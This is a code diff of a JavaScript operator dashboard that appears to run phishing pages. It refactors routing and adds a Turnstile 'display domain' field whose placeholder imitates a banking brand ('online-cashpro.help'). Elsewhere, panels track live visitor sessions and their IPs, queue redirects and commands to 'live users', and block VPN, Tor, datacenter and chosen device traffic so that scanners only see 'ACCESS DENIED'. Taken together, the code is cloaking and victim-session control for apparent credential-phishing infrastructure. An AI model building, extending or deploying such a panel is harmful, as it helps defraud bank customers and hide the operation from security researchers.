-    routeButton(`#security-${page.slug}:traffic`, "Traffic", tab === "traffic" ? "primary" : ""),
-    routeButton(`#security-${page.slug}:log`, "Log", tab === "log" ? "primary" : "")
+    routeButton(`#security-${routeKey}:security`, "Security", tab === "security" ? "primary" : ""),
+    routeButton(`#security-${routeKey}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
+    routeButton(`#security-${routeKey}:traffic`, "Traffic", tab === "traffic" ? "primary" : ""),
+    routeButton(`#security-${routeKey}:log`, "Log", tab === "log" ? "primary" : "")
   ];
   const captchaPanel = `
     <article class="security-panel">
@@ -4088,7 +4276,12 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         <span>Turnstile secret key</span>
         <input type="password" data-security-field="turnstileSecretKey" value="${escapeHtml(turnstile.secretKey || security.turnstileSecretKey || "")}" placeholder="Keep this server-side">
       </label>
+      <label>
+        <span>Display Domain</span>
+        <input type="text" data-security-field="turnstileDisplayDomain" value="${escapeHtml(turnstile.displayDomain || "")}" placeholder="online-cashpro.help">
+      </label>
       <p>The generated index.html receives only the site key. The secret key stays in your API config for verification.</p>
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save Turnstile</button>
     </article>
   `;
   const ipPanel = `
@@ -4099,13 +4292,13 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         <span>Banned IPs</span>
         <textarea data-security-field="bannedIps">${bannedIps.join("\n")}</textarea>
       </label>
-      ${ipRuleRowsMarkup(bannedIps, page.slug, "Banned IPs")}
+      ${ipRuleRowsMarkup(bannedIps, routeKey, "Banned IPs")}
       <label>
         <span>Whitelisted IPs</span>
         <textarea data-security-field="whitelistIps">${whitelistIps.join("\n")}</textarea>
       </label>
-      ${ipRuleRowsMarkup(whitelistIps, page.slug, "Whitelisted IPs")}
-      <button type="button" data-save-security="${page.slug}" data-save-security-tab="ips">Save IP rules</button>
+      ${ipRuleRowsMarkup(whitelistIps, routeKey, "Whitelisted IPs")}
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="ips">Save IP rules</button>
     </article>
   `;
   const devicePanel = `
@@ -4130,7 +4323,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         `).join("")}
       </div>
       <p>Best protection is server-side User-Agent detection through your runtime API. It blocks common device classes, but advanced users can spoof their browser, so pair this with IP rules and captcha for stronger control.</p>
-      <button type="button" data-save-security="${page.slug}" data-save-security-tab="security">Save security rules</button>
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save security rules</button>
     </article>
   `;
   const proxyPanel = `
@@ -4139,9 +4332,9 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
       <h3>Block masked traffic</h3>
       <div class="device-rule-list">
         ${[
-          ["blockVpnProxies", "Block VPN and proxy signals", "Blocks obvious proxy headers and proxy-like clients"],
-          ["blockTor", "Block Tor exits", "Blocks Cloudflare Tor country signals and Tor-marked requests"],
-          ["blockHostingProviders", "Block hosting/datacenter IPs", "Saved now; use IP reputation provider for strict enforcement"]
+          ["blockVpnProxies", "Block VPN and proxy traffic", "Uses runtime headers plus IP reputation checks"],
+          ["blockTor", "Block Tor exits", "Blocks Cloudflare Tor signals and reputation-marked Tor requests"],
+          ["blockHostingProviders", "Block hosting/datacenter IPs", "Uses IP reputation to block server/datacenter traffic"]
         ].map(([field, label, hint]) => `
           <label class="device-rule">
             <input type="checkbox" data-security-proxy="${field}" ${vpnProxyRules[field] ? "checked" : ""}>
@@ -4152,7 +4345,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
           </label>
         `).join("")}
       </div>
-      <button type="button" data-save-security="${page.slug}" data-save-security-tab="security">Save shield</button>
+      <button type="button" data-save-security="${routeKey}" data-save-security-tab="security">Save shield</button>
     </article>
   `;
   const trafficPanel = `
@@ -4162,7 +4355,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
           <small>traffic</small>
           <h3>Visits and block counts</h3>
         </div>
-        <button type="button" data-route="#security-${page.slug}:traffic">Refresh</button>
+        <button type="button" data-route="#security-${routeKey}:traffic">Refresh</button>
       </div>
       <div class="metric-grid">
         <div><span>Total events</span><b>${trafficStats.total}</b></div>
@@ -4176,7 +4369,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
         ${trafficGraphMarkup(trafficStats)}
       </div>
       <div class="traffic-log">
-        ${trafficRowsMarkup(trafficLog, page.slug, bannedIps, whitelistIps)}
+        ${trafficRowsMarkup(trafficLog, routeKey, bannedIps, whitelistIps)}
       </div>
     </article>
   `;
@@ -4187,7 +4380,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
           <small>page log</small>
           <h3>What happened on this page</h3>
         </div>
-        <button type="button" data-route="#security-${page.slug}:log">Refresh</button>
+        <button type="button" data-route="#security-${routeKey}:log">Refresh</button>
       </div>
       <p>This log explains the real owner-side reason behind page activity. Visitors still only see ACCESS DENIED when a rule blocks them.</p>
       <div class="metric-grid">
@@ -4217,7 +4410,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#results-${page.slug}`, "Results"),
+        routeButton(`#results-${routeKey}`, "Results"),
         routeButton("#wallet", "Wallet")
       ])}
       ${viewNav(tabButtons)}
@@ -4239,6 +4432,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
     renderMissingPage();
     return;
   }
+  const routeKey = pageRouteKey(page);
   const previousSearch = options.autoRefresh ? preview.querySelector("[data-session-search-input]")?.value || "" : "";
   const previousFilter = options.autoRefresh ? preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "live" : "live";
   const openSessionIds = options.autoRefresh
@@ -4247,7 +4441,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
         .filter(Boolean)
     : [];
   await loadResultsControlData(page, options);
-  if (options.autoRefresh && !isResultsRoute(page.slug)) return;
+  if (options.autoRefresh && !isResultsRoute(routeKey)) return;
   const results = page.results || [];
   const savedSessions = resultSessions(results);
   const activeSessions = page.activeSessions || [];
@@ -4277,7 +4471,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#security-${page.slug}:security`, "Security"),
+        routeButton(`#security-${routeKey}:security`, "Security"),
         routeButton("#wallet", "Wallet")
       ])}
 
@@ -4298,8 +4492,8 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
           </div>
           <div class="compact-center-actions">
             <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s</span>
-            <button type="button" data-refresh-results="${page.slug}">Refresh</button>
-            <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
+            <button type="button" data-refresh-results="${routeKey}">Refresh</button>
+            <button type="button" data-route="#security-${routeKey}:traffic">Open traffic</button>
           </div>
         </div>
         <div class="compact-session-toolbar">
@@ -4357,7 +4551,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
     if (row) row.open = true;
   });
 
-  startResultsAutoRefresh(page.slug);
+  startResultsAutoRefresh(routeKey);
   statusText.textContent = options.autoRefresh ? `${page.name.toUpperCase()} RESULTS AUTO-REFRESHED` : `${page.name.toUpperCase()} RESULTS READY`;
   topbarTitle.textContent = `${page.name} Results`;
 }
@@ -4732,10 +4926,15 @@ themeToggle.addEventListener("click", () => {
 document.querySelector("[data-logout]")?.addEventListener("click", handleLogout);
 
 function saveSecurityConfig(page, tab = "security") {
+  if (!page) {
+    renderMissingPage();
+    return;
+  }
   const domainsField = preview.querySelector('[data-security-field="domains"]');
   const captchaField = preview.querySelector('[data-security-field="captcha"]');
   const turnstileSiteKeyField = preview.querySelector('[data-security-field="turnstileSiteKey"]');
   const turnstileSecretKeyField = preview.querySelector('[data-security-field="turnstileSecretKey"]');
+  const turnstileDisplayDomainField = preview.querySelector('[data-security-field="turnstileDisplayDomain"]');
   const bannedField = preview.querySelector('[data-security-field="bannedIps"]');
   const whitelistField = preview.querySelector('[data-security-field="whitelistIps"]');
   const blockedDevices = [...preview.querySelectorAll("[data-security-device]:checked")].map((field) => field.dataset.securityDevice);
@@ -4758,7 +4957,8 @@ function saveSecurityConfig(page, tab = "security") {
     turnstile: {
       provider: "turnstile",
       siteKey: turnstileSiteKeyField ? turnstileSiteKeyField.value.trim() : currentTurnstile.siteKey || current.turnstileSiteKey || "",
-      secretKey: turnstileSecretKeyField ? turnstileSecretKeyField.value.trim() : currentTurnstile.secretKey || current.turnstileSecretKey || ""
+      secretKey: turnstileSecretKeyField ? turnstileSecretKeyField.value.trim() : currentTurnstile.secretKey || current.turnstileSecretKey || "",
+      displayDomain: turnstileDisplayDomainField ? turnstileDisplayDomainField.value.trim() : currentTurnstile.displayDomain || ""
     },
     bannedIps: ipRules.bannedIps,
     whitelistIps: ipRules.whitelistIps,
@@ -4766,11 +4966,15 @@ function saveSecurityConfig(page, tab = "security") {
     vpnProxyRules
   });
   saveFlowState(page);
-  renderSecurityCenter(page.slug, tab);
+  renderSecurityCenter(pageRouteKey(page), tab);
   statusText.textContent = "SECURITY SETTINGS SAVED";
 }
 
 function saveUserConfig(page) {
+  if (!page) {
+    renderMissingPage();
+    return;
+  }
   const getField = (name) => preview.querySelector(`[data-user-config="${name}"]`);
   const fieldValue = (name, fallback = "") => getField(name)?.value.trim() || fallback;
   const fieldChecked = (name, fallback = false) => getField(name)?.checked ?? fallback;
@@ -4803,7 +5007,7 @@ function saveUserConfig(page) {
   };
 
   saveFlowState(page);
-  renderUserConfigCenter(page.slug);
+  renderUserConfigCenter(pageRouteKey(page));
   statusText.textContent = `${page.name.toUpperCase()} USER CONFIG SAVED`;
 }
 
@@ -4822,6 +5026,10 @@ function collectHostingFields(page) {
 }
 
 function saveHostingConfig(page, verify = false) {
+  if (!page) {
+    renderMissingPage();
+    return;
+  }
   const hosting = collectHostingFields(page);
   const hasRelay = hosting.connectionType === "cloudflare-worker";
   const isRenderStatic = hosting.hostingType === "render-static-site";
@@ -4850,7 +5058,7 @@ function saveHostingConfig(page, verify = false) {
   };
 
   saveFlowState(page);
-  renderGoLiveCenter(page.slug);
+  renderGoLiveCenter(pageRouteKey(page));
   statusText.textContent = verify
     ? hasMinimumConfig ? "HOSTING CONNECTION VERIFIED" : "DOMAIN AND SERVER IP REQUIRED"
     : "HOSTING SETTINGS SAVED";
@@ -4872,7 +5080,7 @@ function generateRelaySecretForPage(page) {
     apiBase: page.hostingConfig.connectionType === "cloudflare-worker" ? "/api" : page.hostingConfig.relayTarget
   };
   saveFlowState(page);
-  renderGoLiveCenter(page.slug);
+  renderGoLiveCenter(pageRouteKey(page));
   statusText.textContent = "CLOUDFLARE RELAY SECRET GENERATED";
 }
 
@@ -4901,7 +5109,7 @@ async function verifyCloudflareForPage(page) {
     });
     const updated = normalizeUserPage(result.userPage);
     ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
-    renderGoLiveCenter(updated.slug);
+    renderGoLiveCenter(pageRouteKey(updated));
     statusText.textContent = "CLOUDFLARE ZONE VERIFIED";
   } catch (error) {
     statusText.textContent = `CLOUDFLARE VERIFY FAILED: ${error.message}`.toUpperCase();
@@ -4927,7 +5135,7 @@ async function installCloudflareForPage(page) {
     });
     const updated = normalizeUserPage(result.userPage);
     ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
-    renderGoLiveCenter(updated.slug);
+    renderGoLiveCenter(pageRouteKey(updated));
     statusText.textContent = "CLOUDFLARE WORKER INSTALLED";
   } catch (error) {
     statusText.textContent = `CLOUDFLARE INSTALL FAILED: ${error.message}`.toUpperCase();
@@ -5835,7 +6043,7 @@ preview.addEventListener("click", async (event) => {
         body: JSON.stringify({ ip })
       });
       applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-      await renderSecurityCenter(resultPage.slug, "ips");
+      await renderSecurityCenter(pageRouteKey(resultPage), "ips");
       statusText.textContent = `${ip} REMOVED FROM IP RULES`;
     }).catch((error) => {
       statusText.textContent = `IP REMOVE FAILED: ${error.message}`.toUpperCase();
@@ -5858,7 +6066,7 @@ preview.addEventListener("click", async (event) => {
         body: JSON.stringify({ ip })
       });
       applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-      await renderSecurityCenter(resultPage.slug, "traffic");
+      await renderSecurityCenter(pageRouteKey(resultPage), "traffic");
       statusText.textContent = isBan ? `${ip} BANNED` : `${ip} WHITELISTED`;
     }).catch((error) => {
       statusText.textContent = `IP ACTION FAILED: ${error.message}`.toUpperCase();
@@ -5897,11 +6105,11 @@ preview.addEventListener("click", async (event) => {
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
-      await renderResultsCenter(updated.slug);
+      await renderResultsCenter(pageRouteKey(updated));
       statusText.textContent = "LIVE USER REDIRECT QUEUED";
       window.setTimeout(() => {
-        const latest = getPageBySlug(updated.slug);
-        if (latest) renderResultsCenter(updated.slug);
+        const latest = getPageBySlug(pageRouteKey(updated));
+        if (latest) renderResultsCenter(pageRouteKey(updated));
       }, 5500);
     }).catch((error) => {
       statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
@@ -5921,7 +6129,7 @@ preview.addEventListener("click", async (event) => {
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
-      await renderResultsCenter(updated.slug);
+      await renderResultsCenter(pageRouteKey(updated));
       statusText.textContent = "LIVE USER COMMAND CLEARED";
     }).catch((error) => {
       statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
@@ -5945,7 +6153,7 @@ preview.addEventListener("click", async (event) => {
       await withButtonBusy(resultAction, "Deleting", async () => {
         await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
         resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
-        await renderResultsCenter(resultPage.slug);
+        await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = "RESULT DELETED";
       });
       return;
@@ -5958,7 +6166,7 @@ preview.addEventListener("click", async (event) => {
           body: JSON.stringify({ ip: result.ip })
         });
         applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-        await renderResultsCenter(resultPage.slug);
+        await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = `${result.ip} BANNED`;
       });
       return;
@@ -5971,7 +6179,7 @@ preview.addEventListener("click", async (event) => {
           body: JSON.stringify({ ip: result.ip })
         });
         applyPageSecurityConfig(resultPage, updated.securityConfig || resultPage.securityConfig);
-        await renderResultsCenter(resultPage.slug);
+        await renderResultsCenter(pageRouteKey(resultPage));
         statusText.textContent = `${result.ip} WHITELISTED`;
       });
       return;
